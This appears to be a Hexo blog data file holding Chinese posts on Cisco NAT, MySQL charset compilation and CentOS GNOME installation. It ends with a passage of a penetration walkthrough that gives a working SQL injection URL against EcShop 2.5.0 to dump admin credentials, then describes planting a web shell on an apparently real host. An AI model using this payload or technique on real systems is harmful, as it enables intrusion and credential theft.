href=\"http://raymii.org/s/articles/OpenSSL_manually_verify_a_certificate_against_a_CRL.html\">http://raymii.org/s/articles/OpenSSL_manually_verify_a_certificate_against_a_CRL.html</a></p>\n"},{"title":"Dynamic mapping in use, cannot change的解决","date":"2010-04-02T11:41:00.000Z","_content":"RO(config)#no ip nat inside source list 1 pool dy<br />%Dynamic mapping in use, cannot change<br />RO(config)#^Z<br />RO#<br />RO#clear ip nat translation * <br />RO#conf t<br />Enter configuration commands, one per lineEnd with CNTL/Z.<br />RO(config)#no ip nat inside source list 1 pool dy<br />RO(config)#<br />RO(config)#<br />","source":"_posts/Dynamic-mapping-in-use,-cannot-change的解决.md","raw":"title: Dynamic mapping in use, cannot change的解决\ncategories: [网络工程]\ntags: []\ndate: 2010-04-02 19:41:00\n---\nRO(config)#no ip nat inside source list 1 pool dy<br />%Dynamic mapping in use, cannot change<br />RO(config)#^Z<br />RO#<br />RO#clear ip nat translation * <br />RO#conf t<br />Enter configuration commands, one per lineEnd with CNTL/Z.<br />RO(config)#no ip nat inside source list 1 pool dy<br />RO(config)#<br />RO(config)#<br />","slug":"Dynamic-mapping-in-use,-cannot-change的解决","published":1,"updated":"2023-04-22T05:42:20.998Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clgrk075b0000w4pi7qlp79z2","content":"<p>RO(config)#no ip nat inside source list 1 pool dy<br />%Dynamic mapping in use, cannot change<br />RO(config)#^Z<br />RO#<br />RO#clear ip nat translation * <br />RO#conf t<br />Enter configuration commands, one per lineEnd with CNTL&#x2F;Z.<br />RO(config)#no ip nat inside source list 1 pool dy<br />RO(config)#<br />RO(config)#<br /></p>\n","site":{"data":{}},"excerpt":"","more":"<p>RO(config)#no ip nat inside source list 1 pool dy<br />%Dynamic mapping in use, cannot change<br />RO(config)#^Z<br />RO#<br />RO#clear ip nat translation * <br />RO#conf t<br />Enter configuration commands, one per lineEnd with CNTL&#x2F;Z.<br />RO(config)#no ip nat inside source list 1 pool dy<br />RO(config)#<br />RO(config)#<br /></p>\n"},{"title":"1115 - Unknown character set","date":"2011-03-29T00:43:00.000Z","_content":"<p>我安装的mysql版本为5.1.47.安装后导入数据，有一条语句是这样写的、</p><p>select branchId,DepName from T_SC_Department order by convert(DepName using gbk)&nbsp;&nbsp;&nbsp;&nbsp;</p><p>提示：</p><p>1115 - Unknown character set: 'gbk</p><p>不支持，gbk的格式。只能重新编译了，语句是固定的。</p><p>我第一次编译的时候选项是这样，有GBK的选项：</p><p>./configure --prefix=/usr/local/mysql&nbsp; --datadir=/videodata/mysqldata/data --with-xcharset=all&nbsp; --with-charset=gbk --with-charset=utf8</p><p>编译后，就是不支持GBK，郁闷死了，看./configure --help 没有--with-xcharset选项，但编译没有错误提示。</p><p>修改选项，如下：</p><p>./configure --prefix=/usr/local/mysql&nbsp; --datadir=/videodata/mysqldata/data --with-extra-charsets=all&nbsp; --with-charset=gbk --with-charset=utf8</p><p>编译后，支持GBK，查询语言胜利通过。</p><p>&nbsp;</p>","source":"_posts/1115 - Unknown character set.md","raw":"title: 1115 - Unknown character set\ncategories: [Linux]\ntags: []\ndate: 2011-03-29 08:43:00\n---\n<p>我安装的mysql版本为5.1.47.安装后导入数据，有一条语句是这样写的、</p><p>select branchId,DepName from T_SC_Department order by convert(DepName using gbk)&nbsp;&nbsp;&nbsp;&nbsp;</p><p>提示：</p><p>1115 - Unknown character set: 'gbk</p><p>不支持，gbk的格式。只能重新编译了，语句是固定的。</p><p>我第一次编译的时候选项是这样，有GBK的选项：</p><p>./configure --prefix=/usr/local/mysql&nbsp; --datadir=/videodata/mysqldata/data --with-xcharset=all&nbsp; --with-charset=gbk --with-charset=utf8</p><p>编译后，就是不支持GBK，郁闷死了，看./configure --help 没有--with-xcharset选项，但编译没有错误提示。</p><p>修改选项，如下：</p><p>./configure --prefix=/usr/local/mysql&nbsp; --datadir=/videodata/mysqldata/data --with-extra-charsets=all&nbsp; --with-charset=gbk --with-charset=utf8</p><p>编译后，支持GBK，查询语言胜利通过。</p><p>&nbsp;</p>","slug":"1115 - Unknown character set","published":1,"updated":"2023-04-22T05:44:28.008Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clgrk3n1h00007opi1ycaftsq","content":"<p>我安装的mysql版本为5.1.47.安装后导入数据，有一条语句是这样写的、</p><p>select branchId,DepName from T_SC_Department order by convert(DepName using gbk)&nbsp;&nbsp;&nbsp;&nbsp;</p><p>提示：</p><p>1115 - Unknown character set: 'gbk</p><p>不支持，gbk的格式。只能重新编译了，语句是固定的。</p><p>我第一次编译的时候选项是这样，有GBK的选项：</p><p>./configure --prefix=/usr/local/mysql&nbsp; --datadir=/videodata/mysqldata/data --with-xcharset=all&nbsp; --with-charset=gbk --with-charset=utf8</p><p>编译后，就是不支持GBK，郁闷死了，看./configure --help 没有--with-xcharset选项，但编译没有错误提示。</p><p>修改选项，如下：</p><p>./configure --prefix=/usr/local/mysql&nbsp; --datadir=/videodata/mysqldata/data --with-extra-charsets=all&nbsp; --with-charset=gbk --with-charset=utf8</p><p>编译后，支持GBK，查询语言胜利通过。</p><p>&nbsp;</p>","site":{"data":{}},"excerpt":"","more":"<p>我安装的mysql版本为5.1.47.安装后导入数据，有一条语句是这样写的、</p><p>select branchId,DepName from T_SC_Department order by convert(DepName using gbk)&nbsp;&nbsp;&nbsp;&nbsp;</p><p>提示：</p><p>1115 - Unknown character set: 'gbk</p><p>不支持，gbk的格式。只能重新编译了，语句是固定的。</p><p>我第一次编译的时候选项是这样，有GBK的选项：</p><p>./configure --prefix=/usr/local/mysql&nbsp; --datadir=/videodata/mysqldata/data --with-xcharset=all&nbsp; --with-charset=gbk --with-charset=utf8</p><p>编译后，就是不支持GBK，郁闷死了，看./configure --help 没有--with-xcharset选项，但编译没有错误提示。</p><p>修改选项，如下：</p><p>./configure --prefix=/usr/local/mysql&nbsp; --datadir=/videodata/mysqldata/data --with-extra-charsets=all&nbsp; --with-charset=gbk --with-charset=utf8</p><p>编译后，支持GBK，查询语言胜利通过。</p><p>&nbsp;</p>"},{"title":"CentOS安装GNOME Desktop Enviroment","date":"2011-08-02T09:41:00.000Z","_content":"前些日子在VMWare上安装CentOS时，没有选装GNOME桌面组件，最近忽然想加上，不想通过网络方式安装，折腾了半天从本地给装上了，备忘一下<br />1、如果连接上网络，可以直接使用yum groupinstall &quot;GNOME Desktop Environment&quot;<br />2、本地安装方式：<br />&nbsp;&nbsp;&nbsp;   a)将光盘加载到本地 mount /dev/cdrom /mnt/cdrom<br />&nbsp;&nbsp;&nbsp;   b)在/etc/yum.repos.d/目录下，有两个文件<br />&nbsp;&nbsp;&nbsp;   &nbsp;&nbsp;&nbsp;   CentOS-Base.repo和CentOS-Media.repo<br />&nbsp;&nbsp;&nbsp;   &nbsp;&nbsp;&nbsp;   其中CentOS-Base.repo记录着网络上的yum源的地址和路径信息等<br />&nbsp;&nbsp;&nbsp;   &nbsp;&nbsp;&nbsp;   CentOS-Media.repo记录着可以从本地作为yum源的介质和路径。<br />&nbsp;&nbsp;&nbsp;   &nbsp;&nbsp;&nbsp;   修改CentOS-Media.repo<br />&nbsp;&nbsp;&nbsp;   &nbsp;&nbsp;&nbsp;   <br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   [c5-media]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   name=CentOS-$releasever - Media<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   baseurl=file:///media/CentOS/<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   file:///media/cdrom/<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   file:///media/cdrecorder/<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   file:///mnt/cdrom&nbsp;&nbsp;&nbsp;   #增加这句<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   gpgcheck=1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   enabled=0<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-beta<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   编辑完成后保存，执行以下命令<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   yum --disablerepo=* --enablerepo=c5-media update<br /><br />&nbsp;&nbsp;&nbsp;   c)执行yum --disablerepo=* --enablerepo=c5-media grouplist 查看哪些组件可以选装（X Window System和GNOME Desktop Environment）；<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   执行yum --disablerepo=* --enablerepo=c5-media groupinstall &quot;GNOME Desktop Environment&quot;，<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   如果提示 Error: Missing Dependency: libgaim.so.0 is needed by package nautilus-sendto ，<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   则在光盘CentOS目录下执行rpm -Uvh nautilus-sendto-0.7-5.fc6.i386.rpm，<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   如果提示有依赖关系，加上--nodeps选项，再执行yum --disablerepo=* --enablerepo=c5-media groupinstall &quot;GNOME Desktop Environment&quot;即可，<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   安装GNOME的时候，yum会自动按照依赖关系把X Window安装上去的。<br /><br />&nbsp;&nbsp;&nbsp;  d)启动gnome desktop命令：startx","source":"_posts/CentOS安装GNOME-Desktop-Enviroment.md","raw":"title: CentOS安装GNOME Desktop Enviroment\ncategories: [Linux]\ntags: []\ndate: 2011-08-02 17:41:00\n---\n前些日子在VMWare上安装CentOS时，没有选装GNOME桌面组件，最近忽然想加上，不想通过网络方式安装，折腾了半天从本地给装上了，备忘一下<br />1、如果连接上网络，可以直接使用yum groupinstall &quot;GNOME Desktop Environment&quot;<br />2、本地安装方式：<br />&nbsp;&nbsp;&nbsp;   a)将光盘加载到本地 mount /dev/cdrom /mnt/cdrom<br />&nbsp;&nbsp;&nbsp;   b)在/etc/yum.repos.d/目录下，有两个文件<br />&nbsp;&nbsp;&nbsp;   &nbsp;&nbsp;&nbsp;   CentOS-Base.repo和CentOS-Media.repo<br />&nbsp;&nbsp;&nbsp;   &nbsp;&nbsp;&nbsp;   其中CentOS-Base.repo记录着网络上的yum源的地址和路径信息等<br />&nbsp;&nbsp;&nbsp;   &nbsp;&nbsp;&nbsp;   CentOS-Media.repo记录着可以从本地作为yum源的介质和路径。<br />&nbsp;&nbsp;&nbsp;   &nbsp;&nbsp;&nbsp;   修改CentOS-Media.repo<br />&nbsp;&nbsp;&nbsp;   &nbsp;&nbsp;&nbsp;   <br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   [c5-media]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   name=CentOS-$releasever - Media<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   baseurl=file:///media/CentOS/<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   file:///media/cdrom/<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   file:///media/cdrecorder/<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   file:///mnt/cdrom&nbsp;&nbsp;&nbsp;   #增加这句<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   gpgcheck=1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   enabled=0<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-beta<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   编辑完成后保存，执行以下命令<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   yum --disablerepo=* --enablerepo=c5-media update<br /><br />&nbsp;&nbsp;&nbsp;   c)执行yum --disablerepo=* --enablerepo=c5-media grouplist 查看哪些组件可以选装（X Window System和GNOME Desktop Environment）；<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   执行yum --disablerepo=* --enablerepo=c5-media groupinstall &quot;GNOME Desktop Environment&quot;，<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   如果提示 Error: Missing Dependency: libgaim.so.0 is needed by package nautilus-sendto ，<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   则在光盘CentOS目录下执行rpm -Uvh nautilus-sendto-0.7-5.fc6.i386.rpm，<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   如果提示有依赖关系，加上--nodeps选项，再执行yum --disablerepo=* --enablerepo=c5-media groupinstall &quot;GNOME Desktop Environment&quot;即可，<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   安装GNOME的时候，yum会自动按照依赖关系把X Window安装上去的。<br /><br />&nbsp;&nbsp;&nbsp;  d)启动gnome desktop命令：startx","slug":"CentOS安装GNOME-Desktop-Enviroment","published":1,"updated":"2023-04-22T05:46:52.312Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clgrk6tpj00008opi8j13fwee","content":"<p>前些日子在VMWare上安装CentOS时，没有选装GNOME桌面组件，最近忽然想加上，不想通过网络方式安装，折腾了半天从本地给装上了，备忘一下<br />1、如果连接上网络，可以直接使用yum groupinstall &quot;GNOME Desktop Environment&quot;<br />2、本地安装方式：<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;   a)将光盘加载到本地 mount &#x2F;dev&#x2F;cdrom &#x2F;mnt&#x2F;cdrom<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;   b)在&#x2F;etc&#x2F;yum.repos.d&#x2F;目录下，有两个文件<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;   &amp;nbsp;&amp;nbsp;&amp;nbsp;   CentOS-Base.repo和CentOS-Media.repo<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;   &amp;nbsp;&amp;nbsp;&amp;nbsp;   其中CentOS-Base.repo记录着网络上的yum源的地址和路径信息等<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;   &amp;nbsp;&amp;nbsp;&amp;nbsp;   CentOS-Media.repo记录着可以从本地作为yum源的介质和路径。<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;   &amp;nbsp;&amp;nbsp;&amp;nbsp;   修改CentOS-Media.repo<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;   &amp;nbsp;&amp;nbsp;&amp;nbsp;   <br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   [c5-media]<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   name&#x3D;CentOS-$releasever - Media<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   baseurl&#x3D;file:&#x2F;&#x2F;&#x2F;media&#x2F;CentOS&#x2F;<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   file:&#x2F;&#x2F;&#x2F;media&#x2F;cdrom&#x2F;<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   file:&#x2F;&#x2F;&#x2F;media&#x2F;cdrecorder&#x2F;<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   file:&#x2F;&#x2F;&#x2F;mnt&#x2F;cdrom&amp;nbsp;&amp;nbsp;&amp;nbsp;   #增加这句<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   gpgcheck&#x3D;1<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   enabled&#x3D;0<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   gpgkey&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;pki&#x2F;rpm-gpg&#x2F;RPM-GPG-KEY-beta<br /><br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   编辑完成后保存，执行以下命令<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   yum –disablerepo&#x3D;* –enablerepo&#x3D;c5-media update<br /><br />&amp;nbsp;&amp;nbsp;&amp;nbsp;   c)执行yum –disablerepo&#x3D;* –enablerepo&#x3D;c5-media grouplist 查看哪些组件可以选装（X Window System和GNOME Desktop Environment）；<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   执行yum –disablerepo&#x3D;* –enablerepo&#x3D;c5-media groupinstall &quot;GNOME Desktop Environment&quot;，<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   如果提示 Error: Missing Dependency: libgaim.so.0 is needed by package nautilus-sendto ，<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   则在光盘CentOS目录下执行rpm -Uvh nautilus-sendto-0.7-5.fc6.i386.rpm，<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   如果提示有依赖关系，加上–nodeps选项，再执行yum –disablerepo&#x3D;* –enablerepo&#x3D;c5-media groupinstall &quot;GNOME Desktop Environment&quot;即可，<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   安装GNOME的时候，yum会自动按照依赖关系把X Window安装上去的。<br /><br />&amp;nbsp;&amp;nbsp;&amp;nbsp;  d)启动gnome desktop命令：startx</p>\n","site":{"data":{}},"excerpt":"","more":"<p>前些日子在VMWare上安装CentOS时，没有选装GNOME桌面组件，最近忽然想加上，不想通过网络方式安装，折腾了半天从本地给装上了，备忘一下<br />1、如果连接上网络，可以直接使用yum groupinstall &quot;GNOME Desktop Environment&quot;<br />2、本地安装方式：<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;   a)将光盘加载到本地 mount &#x2F;dev&#x2F;cdrom &#x2F;mnt&#x2F;cdrom<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;   b)在&#x2F;etc&#x2F;yum.repos.d&#x2F;目录下，有两个文件<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;   &amp;nbsp;&amp;nbsp;&amp;nbsp;   CentOS-Base.repo和CentOS-Media.repo<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;   &amp;nbsp;&amp;nbsp;&amp;nbsp;   其中CentOS-Base.repo记录着网络上的yum源的地址和路径信息等<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;   &amp;nbsp;&amp;nbsp;&amp;nbsp;   CentOS-Media.repo记录着可以从本地作为yum源的介质和路径。<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;   &amp;nbsp;&amp;nbsp;&amp;nbsp;   修改CentOS-Media.repo<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;   &amp;nbsp;&amp;nbsp;&amp;nbsp;   <br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   [c5-media]<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   name&#x3D;CentOS-$releasever - Media<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   baseurl&#x3D;file:&#x2F;&#x2F;&#x2F;media&#x2F;CentOS&#x2F;<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   file:&#x2F;&#x2F;&#x2F;media&#x2F;cdrom&#x2F;<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   file:&#x2F;&#x2F;&#x2F;media&#x2F;cdrecorder&#x2F;<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   file:&#x2F;&#x2F;&#x2F;mnt&#x2F;cdrom&amp;nbsp;&amp;nbsp;&amp;nbsp;   #增加这句<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   gpgcheck&#x3D;1<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   enabled&#x3D;0<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   gpgkey&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;pki&#x2F;rpm-gpg&#x2F;RPM-GPG-KEY-beta<br /><br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   编辑完成后保存，执行以下命令<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   yum –disablerepo&#x3D;* –enablerepo&#x3D;c5-media update<br /><br />&amp;nbsp;&amp;nbsp;&amp;nbsp;   c)执行yum –disablerepo&#x3D;* –enablerepo&#x3D;c5-media grouplist 查看哪些组件可以选装（X Window System和GNOME Desktop Environment）；<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   执行yum –disablerepo&#x3D;* –enablerepo&#x3D;c5-media groupinstall &quot;GNOME Desktop Environment&quot;，<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   如果提示 Error: Missing Dependency: libgaim.so.0 is needed by package nautilus-sendto ，<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   则在光盘CentOS目录下执行rpm -Uvh nautilus-sendto-0.7-5.fc6.i386.rpm，<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   如果提示有依赖关系，加上–nodeps选项，再执行yum –disablerepo&#x3D;* –enablerepo&#x3D;c5-media groupinstall &quot;GNOME Desktop Environment&quot;即可，<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;   安装GNOME的时候，yum会自动按照依赖关系把X Window安装上去的。<br /><br />&amp;nbsp;&amp;nbsp;&amp;nbsp;  d)启动gnome desktop命令：startx</p>\n"},{"title":"Linux下渗透嗅探术","date":"2012-04-04T12:29:00.000Z","_content":"<p>作者: BEACH JJ</p><p>内网渗透在攻击层面，其实更趋向于社工和常规漏洞检测的结合，为了了解网内防护措施的设置是通过一步步的刺探和经验积累，有时判断出错，也能进入误区。但是如果能在网内进行嗅探，则能事半功倍，处于一个对网内设置完全透明的状态。本文将从一个注点引发的突破，到控制整个内网的全过程来跟大家讨论，内网的渗透嗅探术和安全防护一些内容。<br /><br />在寻找突破时，更多的是从应用服务来，而应用服务最直观的信息采集，就是端口扫描，不同的应用，开放的服务不一样。所以，在对网络进行信息收集时，大概分为这样两步： 端口探测，程序指纹分析。在端口探测方面，个人喜欢用SuperScan来快速对网段里的应用进行判断</p><p><img small=\"0\" src=\"/images/pic/e48eb4505ab5b8213a2935fb.jpg\" /></p><p>在掌握端口信息后，就要对服务应用程序的指纹进行分析，主要包括版本号、已知的漏洞信息、常规配置信息、针对此应用流行的攻击方法等。本文试着对网内一台提供WEB服务的主机作为突破口，提交一个畸形的请求，如图：</p><p><img small=\"0\" src=\"/images/pic/6d6c6dffc2a50b286d22ebc6.jpg\" /><br /></p><p>从上图可以读取以下信息：<br />系统类型：Fedora<br />应用程序：apache/2.2.4<br />以上只是很简单的手工对程序指纹进行分析，当然在针对web应用的扫描器，还有很多，比较常用的wvs、appscan等。用轻量级的&rdquo;wwwwscan&rdquo;来扫描</p><p><img small=\"0\" src=\"/images/pic/965d283ccf22b3ccb211c7c1.jpg\" /><br /></p><p>由扫描的结果可以看到，与手工探测的结果是一致的。<br /><br />通上面简单的信息收集后，可以了解到网站架构是apache+mysql+php,直接请求URL：<a href=\"http://61.67.xx.116/htdocs/\" target=\"_blank\" rel=\"noopener noreferrer\">http://61.67.xx.116/htdocs/</a></p><p><img small=\"0\" src=\"/images/pic/cd17c5fe6532bbe0b48f31c3.jpg\" /><br /></p><p>发现此站是EcShop架构的站点，其使用的版本信息是V2.5.0。EcShop的版本是存在许多的注入点的。其中user.php文件有个注入漏洞，直接请求URL如下：<br /><a href=\"http://61.67.xx.116/htdocs/user.php?act=order_query&amp;order_sn=\" target=\"_blank\" rel=\"noopener noreferrer\">http://61.67.xx.116/htdocs/user.php?act=order_query&amp;order_sn=</a>&rsquo; union select 1,2,3,4,5,6,concat(user_name,0×7c,password,0×7c,email),8 from ecs_admin_user/*</p><p><img small=\"0\" src=\"/images/pic/533a63b1588c5df036d3cace.jpg\" /><br />获取管理员帐号和密码，ECShop使用的是MD5加密，直接解密。原来密码是admin，有点意料之外。访问管理后台，修改模版处，插入一句木马，即可得到WEBSEHLL，如图：</p><p><img small=\"0\" src=\"/images/pic/e2b6e8a6a79c7993cbefd0c8.jpg\" /><br /></p><p>在获取WEBshell权限后，就需要对系统进行分析，查找Exp了。执行命令如下：<br />#uname &ndash;a<br /><br />返回的信息是&ldquo;Linux fedora 2.6.20-1.2962.fc6 &rdquo;，Linux内核是2.6.20的。<br 